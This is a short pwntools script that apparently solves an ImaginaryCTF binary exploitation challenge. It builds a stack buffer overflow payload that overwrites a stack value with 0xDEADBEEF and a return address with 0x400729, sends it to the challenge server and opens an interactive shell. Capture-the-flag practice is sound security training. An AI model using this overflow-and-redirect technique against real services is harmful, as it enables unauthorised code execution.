from pwn import *

p = remote('chal.imaginaryctf.org', 42002)

payload = b'A'*(0x30-0x8) + p64(0xDEADBEEF)
payload += b'A'*(8) + p64(0x400729)


f = open('solve.txt','wb')

f.write(payload)
print(len(payload))

print(payload)
p.sendline(payload)
p.interactive()
